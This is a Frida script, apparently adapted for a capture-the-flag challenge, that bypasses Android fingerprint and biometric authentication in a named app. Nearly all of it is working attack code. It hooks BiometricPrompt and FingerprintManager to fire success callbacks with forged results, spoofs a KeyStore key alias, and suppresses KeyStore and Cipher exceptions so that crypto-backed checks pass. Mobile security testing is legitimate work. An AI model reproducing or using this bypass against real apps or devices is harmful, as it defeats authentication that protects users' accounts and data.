/* 
    Description: Android Fingerprint Bypass via Exception Handling (Modified for CTF)
    Usage: frida -U -f com.equus.assignmentpro -l bypass.js --no-pause
    
    Modified to handle NoSuchElementException from KeyStore operations
*/

console.log("Fingerprint hooks loaded!");

Java.perform(function () 
{
    //Call in try catch as Biometric prompt is supported since api 28 (Android 9)
    try {hookBiometricPrompt_authenticate();} catch (error){console.log("hookBiometricPrompt_authenticate not supported on this android version")}
    try {hookBiometricPrompt_authenticate2();} catch (error){console.log("hookBiometricPrompt_authenticate not supported on this android version")}
    
    hookFingerprintManager_authenticate();

    // Original Cipher hooks
    hookDoFinal();
    hookDoFinal2();
    hookDoFinal3();
    hookDoFinal4();
    hookDoFinal5();
    hookDoFinal6();
    hookDoFinal7();
    hookUpdate();
    hookUpdate2();
    hookUpdate3();
    hookUpdate4();
    hookUpdate5();

    // NEW: Hook KeyStore operations to handle the PrivateRSAKey issue
    hookKeyStore();
    hookKeyStoreGetEntry();
    hookKeyStoreGetKey();
    
    // NEW: Hook the obfuscated class that's crashing
    hookObfuscatedClasses();
});

var cipherList = [];
var callbackG = null;
var authenticationResultInst = null;
var StringCls = null;

Java.perform(function () 
{
    StringCls = Java.use('java.lang.String');
});

// ==================== NEW KEYSTORE HOOKS ====================

function hookKeyStore() {
    try {
        var KeyStore = Java.use("java.security.KeyStore");
        
        KeyStore.containsAlias.implementation = function(alias) {
            console.log("[KeyStore.containsAlias] Alias: " + alias);
            var result = this.containsAlias(alias);
            console.log("[KeyStore.containsAlias] Result: " + result);
            
            // If the app is checking for PrivateRSAKey, pretend it exists
            if (alias === "PrivateRSAKey" && !result) {
                console.log("[*] Spoofing PrivateRSAKey existence!");
                return true;
            }
            return result;
        };
        console.log("[+] KeyStore.containsAlias hooked");
    } catch (e) {
        console.log("[-] KeyStore.containsAlias hook failed: " + e);
    }
}

function hookKeyStoreGetEntry() {
    try {
        var KeyStore = Java.use("java.security.KeyStore");
        
        KeyStore.getEntry.overload('java.lang.String', 'java.security.KeyStore$ProtectionParameter').implementation = function(alias, protParam) {
            console.log("[KeyStore.getEntry] Alias: " + alias);
            try {
                return this.getEntry(alias, protParam);
            } catch (e) {
                console.log("[KeyStore.getEntry] Exception caught: " + e);
                console.log("[*] Returning null to prevent crash");
                return null;
            }
        };
        console.log("[+] KeyStore.getEntry hooked");
    } catch (e) {
        console.log("[-] KeyStore.getEntry hook failed: " + e);
    }
}

function hookKeyStoreGetKey() {
    try {
        var KeyStore = Java.use("java.security.KeyStore");
        
        KeyStore.getKey.overload('java.lang.String', '[C').implementation = function(alias, password) {
            console.log("[KeyStore.getKey] Alias: " + alias);
            try {
                return this.getKey(alias, password);
            } catch (e) {
                console.log("[KeyStore.getKey] Exception caught: " + e);
                console.log("[*] Returning null to prevent crash");
                return null;
            }
        };
        console.log("[+] KeyStore.getKey hooked");
    } catch (e) {
        console.log("[-] KeyStore.getKey hook failed: " + e);
    }
}

function hookObfuscatedClasses() {
    // Hook the v0.a.d method that's throwing the exception
    try {
        var v0a = Java.use("v0.a");
        var methods = v0a.class.getDeclaredMethods();
        console.log("[*] v0.a methods:");
        methods.forEach(function(m) {
            console.log("    - " + m.getName());
        });
        
        // Try to hook method 'd'
        try {
            v0a.d.overloads.forEach(function(overload) {
                overload.implementation = function() {
                    console.log("[v0.a.d] Called with " + arguments.length + " args");
                    try {
                        return overload.apply(this, arguments);
                    } catch (e) {
                        console.log("[v0.a.d] Exception caught: " + e);
                        if ((e + "").indexOf("NoSuchElementException") !== -1 || 
                            (e + "").indexOf("PrivateRSAKey") !== -1) {
                            console.log("[*] Bypassing KeyStore exception!");
                            return null;
                        }
                        throw e;
                    }
                };
            });
            console.log("[+] v0.a.d hooked");
        } catch (e) {
            console.log("[-] v0.a.d hook failed: " + e);
        }
    } catch (e) {
        console.log("[-] v0.a class not found: " + e);
    }

    // Hook u0.k.b
    try {
        var u0k = Java.use("u0.k");
        u0k.b.overloads.forEach(function(overload) {
            overload.implementation = function() {
                console.log("[u0.k.b] Called");
                try {
                    return overload.apply(this, arguments);
                } catch (e) {
                    console.log("[u0.k.b] Exception caught: " + e);
                    if ((e + "").indexOf("NoSuchElementException") !== -1) {
                        console.log("[*] Bypassing!");
                        return null;
                    }
                    throw e;
                }
            };
        });
        console.log("[+] u0.k.b hooked");
    } catch (e) {
        console.log("[-] u0.k class hook failed: " + e);
    }
}

// ==================== BIOMETRIC HOOKS ====================

function hookBiometricPrompt_authenticate()
{
    var biometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt')['authenticate'].overload('android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');
    console.log("Hooking BiometricPrompt.authenticate()...");
    biometricPrompt.implementation = function(cancellationSignal,executor,callback) 
    {
        console.log("[BiometricPrompt.BiometricPrompt()]: cancellationSignal: " + cancellationSignal +", executor: "+ ", callback: "+ callback);

        var sweet_cipher=null;
        var cryptoObj = Java.use('android.hardware.biometrics.BiometricPrompt$CryptoObject');
        var cryptoInst = cryptoObj.$new(sweet_cipher);
        
        var authenticationResultObj = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
        authenticationResultInst = authenticationResultObj.$new(cryptoInst,0);
        console.log("cryptoInst:, " + cryptoInst + " class: "+ cryptoInst.$className);

        callback.onAuthenticationSucceeded(authenticationResultInst);  
    }   
}

function hookBiometricPrompt_authenticate2()
{
    var biometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt')['authenticate'].overload('android.hardware.biometrics.BiometricPrompt$CryptoObject', 'android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');
    console.log("Hooking BiometricPrompt.authenticate2()...");
    biometricPrompt.implementation = function(crypto,cancellationSignal,executor,callback) 
    {
        console.log("[BiometricPrompt.BiometricPrompt2()]: crypto:" + crypto+ ", cancellationSignal: " + cancellationSignal +", executor: "+ ", callback: "+ callback);

        var authenticationResultObj = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
        authenticationResultInst = authenticationResultObj.$new(crypto,0);
        callbackG = Java.retain(callback); 

        return this.authenticate(crypto,cancellationSignal,executor,callback);
    }   
}

function hookFingerprintManager_authenticate()
{
    var fingerprintManager=null;
    var cryptoObj=null;
    var authenticationResultObj=null;

    try
    {
        fingerprintManager = Java.use('android.hardware.fingerprint.FingerprintManager');
        cryptoObj = Java.use('android.hardware.fingerprint.FingerprintManager$CryptoObject');
        authenticationResultObj = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationResult');
    }
    catch(error){}

    if(fingerprintManager == null)
    {
        console.log("FingerprintManager class not found!");
        return;
    }

    console.log("Hooking FingerprintManager.authenticate()...");

    var fingerprintManager_authenticate = fingerprintManager['authenticate'].overload('android.hardware.fingerprint.FingerprintManager$CryptoObject', 'android.os.CancellationSignal', 'int', 'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback', 'android.os.Handler');
    fingerprintManager_authenticate.implementation = function(crypto,cancel, flags, callback, handler)
    {
        console.log("[FingerprintManager.authenticate()]: crypto: " + crypto + ", flags: "+ flags + ", cancel:" + cancel + ", callback: " + callback + ", handler: "+ handler );
        
        authenticationResultInst = authenticationResultObj.$new(crypto,0);
        callbackG = Java.retain(callback);

        return this.authenticate(crypto, cancel, flags, callback, handler);
    }   
}

function bypass()
{
    Java.perform(function () 
    {
        try 
        {
            var Runnable = Java.use('java.lang.Runnable');
            var Runner = Java.registerClass({
                name: 'com.MWR.Runner',
                implements: [Runnable],
                methods: {
                    run: function () 
                        {
                            try
                            { 
                                callbackG.onAuthenticationSucceeded(authenticationResultInst);
                            } 
                            catch (error)
                            {
                                console.log("exception catched!" + error); 
                            }
                        }
                }
            });

            var Handler = Java.use('android.os.Handler');
            var Looper = Java.use('android.os.Looper'); 
            var loop = Looper.getMainLooper();
            var handler = Handler.$new(loop);
            handler.post(Runner.$new());

        } 
        catch (e) 
        {
            console.log("registerClass error3 >>>>>>>> " + e);
        }
    });
}

// ==================== CIPHER HOOKS (MODIFIED) ====================
// Added handling for NoSuchElementException in addition to IllegalBlockSizeException

function shouldBypassException(error) {
    var errorStr = error + "";
    return errorStr.indexOf("javax.crypto.IllegalBlockSizeException") !== -1 ||
           errorStr.indexOf("NoSuchElementException") !== -1 ||
           errorStr.indexOf("PrivateRSAKey") !== -1 ||
           errorStr.indexOf("KeyStoreException") !== -1 ||
           errorStr.indexOf("UnrecoverableKeyException") !== -1 ||
           errorStr.indexOf("InvalidKeyException") !== -1;
}

function hookDoFinal()
{
    var cipherInit = Java.use('javax.crypto.Cipher')['doFinal'].overload();
    var tmp = null;

    cipherInit.implementation = function() 
    {
        console.log("[Cipher.doFinal()]: cipherObj: " + this);
        
        try
        {  
            tmp = this.doFinal();
        }
        catch (error)
        {
            console.log("[Cipher.doFinal()] Exception: " + error); 

            if (shouldBypassException(error)) {
                console.log("[*] Bypassing exception!");
                return Java.array('byte', []);
            }
            throw error;
        }
        return tmp;
    } 
}

function hookDoFinal2()
{
    var cipherInit = Java.use('javax.crypto.Cipher')['doFinal'].overload('[B');
    var tmp = null;

    cipherInit.implementation = function(byteArr)
    {
        console.log("[Cipher.doFinal2()]: cipherObj: " + this);

        try
        {  
            tmp = this.doFinal(byteArr);
        } 
        catch (error)
        {
            console.log("[Cipher.doFinal2()] Exception: " + error); 

            if (shouldBypassException(error)) {
                console.log("[*] Bypassing exception, returning input!");
                return byteArr;
            }
            throw error;
        }
        return tmp;
    } 
}

function hookDoFinal3()
{
    var cipherInit = Java.use('javax.crypto.Cipher')['doFinal'].overload('[B', 'int');
    var tmp = null;

    cipherInit.implementation = function(byteArr, a1)
    {
        console.log("[Cipher.doFinal3()]: cipherObj: " + this);

        try
        { 
            tmp = this.doFinal(byteArr, a1);
        } 
        catch (error)
        {
            console.log("[Cipher.doFinal3()] Exception: " + error); 

            if (shouldBypassException(error)) {
                console.log("[*] Bypassing exception!");
                return 1;
            }
            throw error;
        }
        return tmp;
    } 
}

function hookDoFinal4()
{
    var cipherInit = Java.use('javax.crypto.Cipher')['doFinal'].overload('java.nio.ByteBuffer', 'java.nio.ByteBuffer');
    var tmp = null;

    cipherInit.implementation = function(a1, a2) 
    {
        console.log("[Cipher.doFinal4()]: cipherObj: " + this);

        try
        {          
            tmp = this.doFinal(a1, a2);
        } 
        catch (error)
        {
            console.log("[Cipher.doFinal4()] Exception: " + error); 

            if (shouldBypassException(error)) {
                console.log("[*] Bypassing exception!");
                return 1;
            }
            throw error;
        }
        return tmp;
    } 
}

function hookDoFinal5()
{
    var cipherInit = Java.use('javax.crypto.Cipher')['doFinal'].overload('[B', 'int', 'int');
    var tmp = null;

    cipherInit.implementation = function(byteArr, a1, a2)
    {
        console.log("[Cipher.doFinal5()]: cipherObj: " + this);

        try
        { 
            tmp = this.doFinal(byteArr, a1, a2);
        } 
        catch (error)
        {
            console.log("[Cipher.doFinal5()] Exception: " + error); 

            if (shouldBypassException(error)) {
                console.log("[*] Bypassing exception!");
                return byteArr;
            }
            throw error;
        }
        return tmp;
    } 
}

function hookDoFinal6()
{
    var cipherInit = Java.use('javax.crypto.Cipher')['doFinal'].overload('[B', 'int', 'int', '[B');
    var tmp = null;

    cipherInit.implementation = function(byteArr, a1, a2, outputArr)
    {
        console.log("[Cipher.doFinal6()]: cipherObj: " + this);

        try
        {
            tmp = this.doFinal(byteArr, a1, a2, outputArr);
        } 
        catch (error)
        {
            console.log("[Cipher.doFinal6()] Exception: " + error); 

            if (shouldBypassException(error)) {
                console.log("[*] Bypassing exception!");
                return 1;
            }
            throw error;
        }
        
        return tmp;
    } 
}

function hookDoFinal7()
{
    var cipherInit = Java.use('javax.crypto.Cipher')['doFinal'].overload('[B', 'int', 'int', '[B', 'int');
    var tmp = null;

    cipherInit.implementation = function(byteArr, a1, a2, outputArr, a4)
    {
        console.log("[Cipher.doFinal7()]: cipherObj: " + this);

        try
        {
            tmp = this.doFinal(byteArr, a1, a2, outputArr, a4);
        } 
        catch (error)
        {
            console.log("[Cipher.doFinal7()] Exception: " + error); 

            if (shouldBypassException(error)) {
                console.log("[*] Bypassing exception!");
                return 1;
            }
            throw error;
        }

        return tmp;
    } 
}

function hookUpdate()
{
    var cipherInit = Java.use('javax.crypto.Cipher')['update'].overload('[B');
    var tmp = null;

    cipherInit.implementation = function(byteArr) 
    {
        console.log("[Cipher.update()]: cipherObj: " + this);

        try
        {        
            tmp = this.update(byteArr);
        } 
        catch (error)
        {
            console.log("[Cipher.update()] Exception: " + error); 

            if (shouldBypassException(error)) {
                console.log("[*] Bypassing exception!");
                return byteArr;
            }
            throw error;
        }
        return tmp;
    } 
}

function hookUpdate2()
{
    var cipherInit = Java.use('javax.crypto.Cipher')['update'].overload('java.nio.ByteBuffer', 'java.nio.ByteBuffer');
    var tmp = null;

    cipherInit.implementation = function(byteArr, outputArr) 
    {
        console.log("[Cipher.update2()]: cipherObj: " + this);

        try
        {
            tmp = this.update(byteArr, outputArr);
        } 
        catch (error)
        {
            console.log("[Cipher.update2()] Exception: " + error);

            if (shouldBypassException(error)) {
                console.log("[*] Bypassing exception!");
                return 1;
            }
            throw error;
        }
        return tmp;
    } 
}

function hookUpdate3()
{
    var cipherInit = Java.use('javax.crypto.Cipher')['update'].overload('[B', 'int', 'int');
    var tmp = null;

    cipherInit.implementation = function(byteArr, a1, a2) 
    {
        console.log("[Cipher.update3()]: cipherObj: " + this);

        try
        {
            tmp = this.update(byteArr, a1, a2);
        } 
        catch (error)
        {
            console.log("[Cipher.update3()] Exception: " + error); 

            if (shouldBypassException(error)) {
                console.log("[*] Bypassing exception!");
                return byteArr;
            }
            throw error;
        }
        return tmp;
    } 
}

function hookUpdate4()
{
    var cipherInit = Java.use('javax.crypto.Cipher')['update'].overload('[B', 'int', 'int', '[B');
    var tmp = null;

    cipherInit.implementation = function(byteArr, a1, a2, outputArr) 
    {
        console.log("[Cipher.update4()]: cipherObj: " + this);

        try
        {
            tmp = this.update(byteArr, a1, a2, outputArr);
        } 
        catch (error)
        {
            console.log("[Cipher.update4()] Exception: " + error); 

            if (shouldBypassException(error)) {
                console.log("[*] Bypassing exception!");
                return 1;
            }
            throw error;
        }
        return tmp;
    } 
}

function hookUpdate5()
{
    var cipherInit = Java.use('javax.crypto.Cipher')['update'].overload('[B', 'int', 'int', '[B', 'int');
    var tmp = null;

    cipherInit.implementation = function(byteArr, a1, a2, outputArr, a4) 
    {
        console.log("[Cipher.update5()]: cipherObj: " + this);
        try
        {
            tmp = this.update(byteArr, a1, a2, outputArr, a4);
        } 
        catch (error)
        {
            console.log("[Cipher.update5()] Exception: " + error);

            if (shouldBypassException(error)) {
                console.log("[*] Bypassing exception!");
                return 1;
            }
            throw error;
        }

        return tmp;
    } 
}